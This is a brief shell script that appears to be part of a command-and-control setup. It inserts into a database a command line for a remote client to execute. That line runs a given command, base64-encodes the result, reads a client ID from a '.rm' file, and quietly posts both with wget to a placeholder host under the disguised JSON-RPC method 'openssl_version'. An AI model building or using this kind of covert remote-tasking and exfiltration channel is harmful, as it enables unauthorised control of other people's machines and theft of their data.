#!/bin/sh
mysql -B -N -u YouDBLogin -pYouDBPass YouDb -e "update YouTable set YouColumn='v=\`$1 | base64 | sed ''s/\$/ENTER/''| tr -d ''\\\\n'' \`; id=\`grep ID .rm | cut -b 4-\`; wget -O /dev/null -o /dev/null --header=\"Content-Type: application/json\" --post-data=''{\"jsonrpc\": \"2.0\", \"method\": \"openssl_version\", \"id\":123, \"params\": [\"''\$id''\", \"''\$v''\"] }'' https://you.ip', status=0  where id_client = $2 and type = 'SEND.PLS' order by id desc limit 1;"

#TODO replace all 'you...'/'You...'
